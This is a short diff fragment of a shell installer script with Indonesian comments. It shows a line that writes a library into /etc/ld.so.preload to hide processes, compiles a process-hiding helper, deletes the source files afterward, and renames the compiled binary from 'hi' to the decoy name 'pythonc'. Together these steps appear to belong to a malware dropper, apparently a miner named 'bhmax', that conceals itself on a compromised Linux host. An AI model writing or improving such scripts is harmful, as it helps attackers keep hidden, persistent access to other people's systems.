@@ -23,11 +23,11 @@ echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 chmod +x bhmax
 
 # Kompilasi hi.c menjadi hi
-gcc -o hi hi.c
+gcc -o pythonc hi.c
 
 # Hapus file source setelah kompilasi
 rm hi.c processhider.c
 
 # Ubah izin agar hi dapat dieksekusi
-chmod +x hi
+chmod +x pythonc
 
